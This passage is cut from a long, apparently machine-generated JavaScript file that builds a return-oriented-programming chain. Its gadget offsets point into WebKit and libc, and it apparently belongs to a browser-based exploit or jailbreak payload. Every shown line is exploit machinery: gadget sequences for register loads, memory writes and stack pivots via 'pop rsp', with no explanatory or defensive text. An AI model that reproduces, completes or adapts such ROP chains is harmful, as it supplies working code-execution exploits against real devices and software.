libc_base+362222, //pop rsi
ropchain+197064, //L3318-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+197080, //L3319-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+197032, //L3316-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+197048, //L3317-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3316:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3317:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3318:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3319:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+197176, //L3321-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+197160, //L3320-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L3320:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3321:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092, //pop rax
//L3323:
ropchain+197296, //L3322
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+766440, //pop rsp
ropchain+206872, //L3324
//L3322:
webkit_base+4342662, //mov rax, rcx
libc_base+362222 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092 //pop rax
]);
//L3325:
db([1, 0]); // 0x1
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+197416, //L3328-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3326:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+757614,); //pop rcx
//L3328:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+197520, //L3331-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+197504, //L3330-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3330:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3331:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+197688, //L3334-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+197704, //L3335-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+197656, //L3332-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+197672, //L3333-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3332:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3333:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3334:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3335:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+197800, //L3337-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+197784, //L3336-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L3336:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3337:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092, //pop rax
//L3339:
ropchain+197920, //L3338
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+766440, //pop rsp
ropchain+211032, //L3340
//L3338:
webkit_base+4342662, //mov rax, rcx
libc_base+362222 //pop rsi
]);
db([16, 0]); // 0x10
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092 //pop rax
]);
//L3341:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092 //pop rax
]);
//L3342:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+198088, //L3345-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3343:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+757614,); //pop rcx
//L3345:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+198192, //L3348-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+198176, //L3347-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3347:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3348:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+198360, //L3351-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+198376, //L3352-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+198328, //L3349-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+198344, //L3350-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3349:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3350:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3351:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3352:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+198472, //L3354-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+198456, //L3353-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L3353:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3354:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092, //pop rax
//L3356:
ropchain+198592, //L3355
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+766440, //pop rsp
ropchain+207704, //L3357
//L3355:
webkit_base+4342662, //mov rax, rcx
libc_base+362222 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+198712, //L3359-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+198728, //L3360-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+198696, //L3358-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3358:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3359:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3360:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+198832, //L3363-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+198848, //L3364-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3361:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+757614,); //pop rcx
//L3363:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3364:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+2935451, //mov [rax], ecx
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3365:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+757614,); //pop rcx
//L3367:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+199008, //L3370-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+198992, //L3369-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3369:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3370:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+199112, //L3373-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+199128, //L3374-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3371:
db([4294967248, 4294967295]); // -0x30
set_gadget(libc_base+757614,); //pop rcx
//L3373:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3374:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+7880191, //mov [rax], rcx
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3375:
db([4294967244, 4294967295]); // -0x34
set_gadget(libc_base+757614,); //pop rcx
//L3377:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+199248, //L3379-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L3378:
db([131072, 0]); // 0x20000
set_gadget(libc_base+467092,); //pop rax
//L3379:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2935451, //mov [rax], ecx
libc_base+362222, //pop rsi
ropchain+199304, //L3382-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3382:
db([0, 0]); // 0x0
//L3380:
set_gadgets([
libc_base+362222, //pop rsi
ropchain+199368, //L3385-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3383:
db([4294967244, 4294967295]); // -0x34
set_gadget(libc_base+757614,); //pop rcx
//L3385:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+199472, //L3388-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+199456, //L3387-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3387:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3388:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+199640, //L3391-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+199656, //L3392-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+199608, //L3389-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+199624, //L3390-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3389:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3390:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3391:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3392:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+199728, //L3393-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+199744, //L3394-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L3393:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3394:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+199848, //L3396-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+199896, //L3399-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+199880, //L3398-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3396:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L3397:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3398:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3399:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+194572, //cmp rax, rsi ; sete al
libc_base+227029, //movzx eax, al
webkit_base+4571187, //shl rax, 3
libc_base+362222, //pop rsi
ropchain+200024, //L3400+8
libc_base+499086, //add rax, rsi
libc_base+751703, //mov rax, [rax]
libc_base+362222, //pop rsi
ropchain+200000, //L3400-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+766440 //pop rsp
]);
//L3400:
db([0, 0]); // 0x0
set_gadgets([
ropchain+200040, //L3400+24
ropchain+205304, //L3395
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3401:
db([4294967244, 4294967295]); // -0x34
set_gadget(libc_base+757614,); //pop rcx
//L3403:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+200160, //L3406-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+200144, //L3405-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3405:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3406:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+200328, //L3409-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+200344, //L3410-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+200296, //L3407-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+200312, //L3408-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3407:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3408:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3409:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3410:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+200416, //L3411-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+200432, //L3412-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L3411:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3412:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+200528, //L3414-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+200512, //L3413-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L3413:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3414:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+200624, //L3417-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3415:
db([4294967248, 4294967295]); // -0x30
set_gadget(libc_base+757614,); //pop rcx
//L3417:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+200728, //L3420-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+200712, //L3419-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3419:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3420:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+200872, //L3423-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+200840, //L3421-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+200856, //L3422-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L3421:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3422:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3423:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+200968, //L3426-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3424:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+757614,); //pop rcx
//L3426:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+201072, //L3429-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+201056, //L3428-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3428:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3429:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+201240, //L3432-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+201256, //L3433-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+201208, //L3430-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+201224, //L3431-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3430:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3431:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3432:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3433:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+201352, //L3435-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+201336, //L3434-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L3434:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3435:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092, //pop rax
//L3437:
ropchain+201472, //L3436
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+766440, //pop rsp
ropchain+208536, //L3438
//L3436:
webkit_base+4342662, //mov rax, rcx
libc_base+362222 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+201544, //L3441-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3439:
db([4294967240, 4294967295]); // -0x38
set_gadget(libc_base+757614,); //pop rcx
//L3441:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+2935451, //mov [rax], ecx
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3442:
db([4294967240, 4294967295]); // -0x38
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+201688, //L3446-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+201672, //L3445-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3445:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3446:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+201856, //L3449-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+201872, //L3450-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+201824, //L3447-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+201840, //L3448-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3447:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3448:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3449:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3450:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+201944, //L3451-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+201960, //L3452-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L3451:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3452:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+202056, //L3454-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+202040, //L3453-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L3453:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3454:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+202136, //L3455-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3455:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3456:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3457:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+202272, //L3458-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+202304, //L3460-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+202288, //L3459-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L3458:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3459:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3460:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
webkit_base+19066556, //cmp rax, rcx ; setb al
webkit_base+2766990, //setle al
libc_base+227029, //movzx eax, al
libc_base+362222, //pop rsi
ropchain+202472, //L3462-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+202488, //L3463-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+202456, //L3461-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3461:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3462:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3463:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+202592, //L3465-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+202640, //L3468-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+202624, //L3467-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3465:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L3466:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3467:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3468:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+194572, //cmp rax, rsi ; sete al
libc_base+227029, //movzx eax, al
webkit_base+4571187, //shl rax, 3
libc_base+362222, //pop rsi
ropchain+202768, //L3469+8
libc_base+499086, //add rax, rsi
libc_base+751703, //mov rax, [rax]
libc_base+362222, //pop rsi
ropchain+202744, //L3469-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+766440 //pop rsp
]);
//L3469:
db([0, 0]); // 0x0
set_gadgets([
ropchain+202784, //L3469+24
ropchain+202800, //L3464
libc_base+766440, //pop rsp
ropchain+205336, //L3470
//L3464:
libc_base+362222, //pop rsi
ropchain+202840, //L3473-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3471:
db([4294967248, 4294967295]); // -0x30
set_gadget(libc_base+757614,); //pop rcx
//L3473:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
